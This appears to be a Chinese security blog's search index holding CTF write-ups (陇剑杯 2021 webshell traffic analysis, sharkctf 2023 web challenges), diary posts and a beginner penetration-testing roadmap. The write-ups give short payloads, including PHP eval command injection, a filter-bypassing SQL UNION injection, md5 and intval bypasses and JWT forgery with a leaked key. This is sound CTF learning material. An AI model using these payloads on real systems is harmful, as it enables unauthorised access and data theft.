        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-webshell（问1）"><a href="#陇剑杯-2021-webshell（问1）" class="headerlink" title="陇剑杯 2021  webshell（问1）"></a>陇剑杯 2021  webshell（问1）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。</p><pre><code>http.request.method==POST</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png"><br>然后追踪流看看，运气比较好第一个就是。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png"><br>交差下班。</p><h2 id="陇剑杯-2021webshell（问2）"><a href="#陇剑杯-2021webshell（问2）" class="headerlink" title="陇剑杯 2021webshell（问2）"></a>陇剑杯 2021webshell（问2）</h2><pre><code>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>关键词：日志。直接搜索.log看看.<br>发现东西有点多。<br>需要再想个法子缩小范围。<br>想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png"><br>发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。</p><p>然后就一个个看，第一个就是。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png"><br>但是发现只是相对路径，所以还要结合传马的位置拼接得到：<br><code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p><h2 id="陇剑杯-2021webshell（问3）"><a href="#陇剑杯-2021webshell（问3）" class="headerlink" title="陇剑杯 2021webshell（问3）"></a>陇剑杯 2021webshell（问3）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。<br>我们不妨直接猜一手，因为一般权限无非root 和www-data.<br>得到是www-data</p><h2 id="陇剑杯-2021webshell（问4）"><a href="#陇剑杯-2021webshell（问4）" class="headerlink" title="陇剑杯 2021webshell（问4）"></a>陇剑杯 2021webshell（问4）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>这一问就不用说了，前面就已经看出来1.php就是马子了。<br>要是非问为啥，那原因就是看他流量特征，一眼蚁剑<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png"></p><p><a href="https://www.freebuf.com/articles/network/204796.html">常见webshell客户端流量特征</a></p><h2 id="陇剑杯-2021webshell（问5）"><a href="#陇剑杯-2021webshell（问5）" class="headerlink" title="陇剑杯 2021webshell（问5）"></a>陇剑杯 2021webshell（问5）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 <code>ls</code> 命令的返回包。发现了frpc.ini<br>于是直接就能得出就是frpc了。</p><p>还有正常解法，就是看看比较大的包，大概率就是上传的包了。</p><h2 id="陇剑杯-2021webshell（问6）"><a href="#陇剑杯-2021webshell（问6）" class="headerlink" title="陇剑杯 2021webshell（问6）"></a>陇剑杯 2021webshell（问6）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。开启环境0</code></pre><p>这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。<br>最后就得到反连的ip是192.168.239.123</p><h2 id="陇剑杯-2021webshell（问7）"><a href="#陇剑杯-2021webshell（问7）" class="headerlink" title="陇剑杯 2021webshell（问7）"></a>陇剑杯 2021webshell（问7）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF&#123;&#125;格式提交。开启环境0</code></pre><p>都在hex解密之后的frpc.ini中<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sharkctf_2023</title>
      <link href="/2023/08/22/sharkctf_2023/"/>
      <url>/2023/08/22/sharkctf_2023/</url>
      
        <content type="html"><![CDATA[<p><code>暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。</code></p><hr><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了</p><h3 id="敏感路径"><a href="#敏感路径" class="headerlink" title="敏感路径"></a>敏感路径</h3><p>这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 &#x2F;goat。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png"><br>推荐一下这个插件：findsomething（尊嘟很好用）</p><h3 id="F12查看网页源码"><a href="#F12查看网页源码" class="headerlink" title="F12查看网页源码"></a>F12查看网页源码</h3><p>直接拼接就是一个F12题了，F12查看源码得到flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png"></p><h2 id="Ez-http"><a href="#Ez-http" class="headerlink" title="Ez_http"></a>Ez_http</h2><p>VidocQwQ说http好简单，我们一起学习吧。</p><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png"></p><h3 id="XFF头ip绕过"><a href="#XFF头ip绕过" class="headerlink" title="XFF头ip绕过"></a>XFF头ip绕过</h3><p>使用hackbar进行操作添加XFF头。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png"></p><h3 id="Referer来源绕过"><a href="#Referer来源绕过" class="headerlink" title="Referer来源绕过"></a>Referer来源绕过</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png"></p><h3 id="UA绕过"><a href="#UA绕过" class="headerlink" title="UA绕过"></a>UA绕过</h3><p>UA头一般用来确定浏览器类型<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png"></p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h2><p>VidocQwQ邀请你一起打游戏辣，2048都会吧？</p><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><p>看题目意思应该是要查看源码，但是禁用了F12和右键。<br>不过可以通过谷歌浏览器的设置打开开发者工具<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png"><br>源码发现提示hint.php<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png"></p><h3 id="源码查询发现路由及参数"><a href="#源码查询发现路由及参数" class="headerlink" title="源码查询发现路由及参数"></a>源码查询发现路由及参数</h3><p>直接拼接访问的话发现什么也没有。<br>于是回到前面查看源码，但是代码有点长。<br>于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png"><br>发现相关源码，于是直接可以拼接获得flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png"></p><h2 id="Ez-eval"><a href="#Ez-eval" class="headerlink" title="Ez_eval"></a>Ez_eval</h2><p>VidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？</p><h3 id="开局送源码"><a href="#开局送源码" class="headerlink" title="开局送源码"></a>开局送源码</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png"><br>审计发现通过word传参命令执行，过滤flag字段。</p><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>?word=system(&quot;cat /f*&quot;);</code><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png"></p><h2 id="Ez-SQL"><a href="#Ez-SQL" class="headerlink" title="Ez_SQL"></a>Ez_SQL</h2><h3 id="手工做法："><a href="#手工做法：" class="headerlink" title="手工做法："></a>手工做法：</h3><h4 id="查看源码有提示"><a href="#查看源码有提示" class="headerlink" title="查看源码有提示"></a>查看源码有提示</h4><p>提示将select替换为空。<br>绕过办法：分拆绕过，过滤时重组形成payload</p><h4 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h4><p>先order by 确定一下字段数，<br><code>username=123&#39;order by 4--+</code><br>发现字段为4。使用hackerbar辅助构造payload<br><code>username=123&#39;union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+</code><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png"><br>然后就使用相同方式构造注入语句拿下flag。</p><h3 id="工具梭哈"><a href="#工具梭哈" class="headerlink" title="工具梭哈"></a>工具梭哈</h3><p>sqlmap一把梭，具体使用就自己查一查了哈。</p><h2 id="哈斯哈斯哈斯（bt"><a href="#哈斯哈斯哈斯（bt" class="headerlink" title="哈斯哈斯哈斯（bt"></a>哈斯哈斯哈斯（bt</h2><p>1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>开局一个登录框，弱口令是试一下，得到：<br>admin:admin</p><h3 id="查看源码-传参"><a href="#查看源码-传参" class="headerlink" title="查看源码+传参"></a>查看源码+传参</h3><p>跳转后页面看看源码得到提示。<br><code>你给我hint我给你hint</code><br>猜测传参hint。</p><h3 id="php审计"><a href="#php审计" class="headerlink" title="php审计"></a>php审计</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png"></p><pre><code class="php">&lt;?php  error_reporting(0);  require_once(&#39;/flag.php&#39;);   if(isset($_GET[&#39;hint&#39;]))&#123;    highlight_file(__FILE__);  &#125;  else&#123;      include_once &quot;loginok.html&quot;;  &#125;  $a=$_GET[&#39;a&#39;];  $b=$_GET[&#39;b&#39;];  $hash=$_COOKIE[&#39;hash&#39;];  $word=$_POST[&#39;word&#39;];  if($a !== $b &amp; md5($a) === md5($b))&#123;      echo &#39; WOW,u are so cool &#39;;      echo strlen($flag);  &#125;  if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;      if(intval($word) === intval(strrev($word)))&#123;          echo &quot; 宝贝,flag快出来了哦,加油捏 &quot;;          echo md5($flag);      &#125;  &#125;  if ($hash === md5($flag . $word))        echo &quot; Wooooooo!You cracked the md5. Here is your flag &quot; . $flag;  ?&gt;</code></pre><pre><code class="php">大概有三层判断：1`.if($a !== $b &amp; md5($a) === md5($b))&#123;`2`.`if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;      if(intval($word) === intval(strrev($word)))&#123;``3`.if ($hash === md5($flag . $word))`</code></pre><h3 id="1-值不相同但md5加密后相同（数组绕过md5强比较）"><a href="#1-值不相同但md5加密后相同（数组绕过md5强比较）" class="headerlink" title="1. 值不相同但md5加密后相同（数组绕过md5强比较）"></a>1. 值不相同但md5加密后相同（数组绕过md5强比较）</h3><ul><li>通过数组类型一致，但值不一致。</li><li>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li><li>中间的为什么是&amp;而不是&amp;&amp;。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a></li></ul><h3 id="2-1952开头NUAA结尾，倒序并interval-后仍相同"><a href="#2-1952开头NUAA结尾，倒序并interval-后仍相同" class="headerlink" title="2.1952开头NUAA结尾，倒序并interval()后仍相同"></a>2.1952开头NUAA结尾，倒序并interval()后仍相同</h3><ul><li>正常进行输入的情况如下： <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png"><br>相关定义可以自己去查一下（我懒）</li></ul><p>大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。<br>小trick：科学计数法<br>我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。</p><p>payload:<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png"></p><p>得到md5值</p><h3 id="3-word置空进行绕过。"><a href="#3-word置空进行绕过。" class="headerlink" title="3.word置空进行绕过。"></a>3.word置空进行绕过。</h3><p>这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。<br>word参数直接置空并且加上hash就可以得到flag了。</p><p>下班！</p><h2 id="伤身体（ssti"><a href="#伤身体（ssti" class="headerlink" title="伤身体（ssti"></a>伤身体（ssti</h2><p>1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！</p><h3 id="弱口令登入"><a href="#弱口令登入" class="headerlink" title="弱口令登入"></a>弱口令登入</h3><p>admin:password</p><h3 id="ssti注入"><a href="#ssti注入" class="headerlink" title="ssti注入"></a>ssti注入</h3><p>ssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。<br>打开fenjing直接一把嗦，具体用法自己查一下吧。</p><h2 id="来抽个奖？"><a href="#来抽个奖？" class="headerlink" title="来抽个奖？"></a>来抽个奖？</h2><p>1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。</p><h4 id="php伪随机数漏洞"><a href="#php伪随机数漏洞" class="headerlink" title="php伪随机数漏洞"></a>php伪随机数漏洞</h4><p>多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。</p><h3 id="爆破种子"><a href="#爆破种子" class="headerlink" title="爆破种子"></a>爆破种子</h3><p>爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a><br>使用教程看看README就行。</p><h3 id="漏洞了解"><a href="#漏洞了解" class="headerlink" title="漏洞了解"></a>漏洞了解</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png"></p><pre><code class="php">&lt;?php  mt_srand(5201314);  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  ?&gt;</code></pre><p>可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。</p><p>下班！</p><h2 id="我不是op！"><a href="#我不是op！" class="headerlink" title="我不是op！"></a>我不是op！</h2><p>1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？</p><p>尝试弱口令无果后随便打一个用户名，发现返回包<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png"><br>得到token一眼jwt，同时解编码message上面的unicode<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png"><br>然后带这个token去&#x2F;protected<br>需要注意的点（这个token是jwt，需要放在cookie里面进行传参）<br>使用GET请求</p><p>构造后的burp请求包：<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png"></p><pre><code>GET http://101.42.30.15:8306/protected HTTP/1.1Host: 101.42.30.15:8306Pragma: no-cacheCache-Control: no-cache  Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7   Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKMsec-ch-ua-platform: &quot;Windows&quot;sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot; sec-ch-ua-mobile: ?0Connection: close</code></pre><p>返回包里<br><code>&lt;!--secret_key = &quot;Lazy_fish_Is_op?&quot;--&gt;</code><br>应该就是jwt的密钥了<br>于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： <a href="https://jwt.io/">https://jwt.io/</a>)<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png"><br>直接修改111为admin然后得到admin的 jwt<br>带这admin的jwt重新访问即可得到flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png"></p><p>Shark{1aZyfish_is_0pppppppppp!}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客更新</title>
      <link href="/2023/08/22/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
      <url>/2023/08/22/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。</p><p>欢迎大家留言，指导指导小菜鸡哈（orz）。</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日记</title>
      <link href="/2023/08/22/%E6%97%A5%E8%AE%B0/"/>
      <url>/2023/08/22/%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>今天事情比较多，今日战绩：图床搭建完成。</p><p>下班！</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Post</title>
      <link href="/2023/08/20/My-First-Post/"/>
      <url>/2023/08/20/My-First-Post/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my blog.</p><p>搭建了一天，终于上线了。</p><p>暑假开始的时候有一个Plan，完成了个P,因为lan。</p><p>后面会随缘更新，更新内容也不确定。凑合着看吧。</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hello </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试入门</title>
      <link href="/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/"/>
      <url>/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>#入门</p><p>练习时长：八周（3又五分之一坤周）</p><h1 id="web开发入门（两周）"><a href="#web开发入门（两周）" class="headerlink" title="web开发入门（两周）"></a>web开发入门（两周）</h1><p><strong>前端语言</strong>:  HTML+CSS+javascript<br>建议时长： 三天 （JS要求高，dom树看懂）</p><p><strong>脚本语言</strong> : python+网络基础和HTTP协议<br>建议时长：七天 </p><p><strong>后端语言</strong>:PHP+SQL+MySQL数据库<br>建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）</p><p><strong>学习方式</strong>： 菜鸟教程进行速通上面的语言学习。</p><p><strong>学习任务</strong>：注册登录页面和登录成功展示静态百度页面</p><h1 id="web渗透入门"><a href="#web渗透入门" class="headerlink" title="web渗透入门"></a>web渗透入门</h1><h2 id="一、信息收集（三天）"><a href="#一、信息收集（三天）" class="headerlink" title="一、信息收集（三天）"></a>一、信息收集（三天）</h2><p>如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。<br>详细文章： <a href="https://www.freebuf.com/articles/web/340195.html">https://www.freebuf.com/articles/web/340195.html</a> </p><p>利用一些工具减轻工作量：</p><ol><li>灯塔ARL   <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>魔改： <a href="https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw">https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw</a></li><li>水泽  <a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></li></ol><h2 id="二、常见漏洞利用（三周）"><a href="#二、常见漏洞利用（三周）" class="headerlink" title="二、常见漏洞利用（三周）"></a>二、常见漏洞利用（三周）</h2><p>对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。</p><p>看一些报告：<br>edusrc:闲鱼上或者自己搜一搜，公众号也有很多文章<br>乌云： <a href="https://wy.zone.ci/">https://wy.zone.ci/</a><br>h1：同样建议搜一搜</p><h2 id="三、渗透测试常用工具使用。-两周"><a href="#三、渗透测试常用工具使用。-两周" class="headerlink" title="三、渗透测试常用工具使用。(两周)"></a>三、渗透测试常用工具使用。(两周)</h2><p>对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。</p><p>靶场：</p><ol><li>pikachu： <a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></li><li>vulhub： <a href="https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168896524816782425130413&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulhub&amp;spm=1018.2226.3001.4187</a> </li><li>tryhackme: <a href="https://tryhackme.com/">https://tryhackme.com/</a> (推荐)</li><li>hackthebox： <a href="https://www.hackthebox.com/">https://www.hackthebox.com/</a></li></ol><p>搭建自己的军火库🧰：</p><ol><li>chorme插件 <a href="https://zhuanlan.zhihu.com/p/257021053">https://zhuanlan.zhihu.com/p/257021053</a></li><li>翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）</li><li>渗透工具:自己囤一囤，<del>肖佬说:(不行就自己开一个)。</del></li><li>武装bp：<br>         1.  <a href="https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg">https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg</a><br>         2. <a href="https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg">https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg</a><br>         3. <a href="https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g">https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g</a></li><li>安装kali： <a href="https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin">https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin</a>  <del>（肖佬说： “算了，我自己写一篇吧”）</del></li></ol><h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><p>社区：</p><ol><li>先知社区： <a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></li><li>网安：         <a href="https://www.wangan.com/">https://www.wangan.com/</a></li><li>freebuf:       <a href="https://www.freebuf.com/">https://www.freebuf.com/</a></li><li>奇安信攻防社区： <a href="https://forum.butian.net/">https://forum.butian.net/</a></li></ol><p>导航：</p><ol><li>黑客街： <a href="https://www.hackjie.com/">https://www.hackjie.com/</a></li></ol><p>公众号： </p><ol><li>鹏组安全</li><li>菜鸟学信安</li><li>李白你好</li></ol><p>参考文章：<br><a href="https://blog.csdn.net/qq_28205153/article/details/123941798">https://blog.csdn.net/qq_28205153/article/details/123941798</a><br><a href="https://cloud.tencent.com/developer/article/2102308">https://cloud.tencent.com/developer/article/2102308</a></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><ul><li><p>建议0基础的同学先从web简单开发开始学。</p></li><li><p>注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。</p></li><li><p>找到适合自己的学习路线和方式</p></li><li><p>使用ai提高效率</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSCTF2023出题笔记</title>
      <link href="/2023/08/20/FSCTF2023%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/08/20/FSCTF2023%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
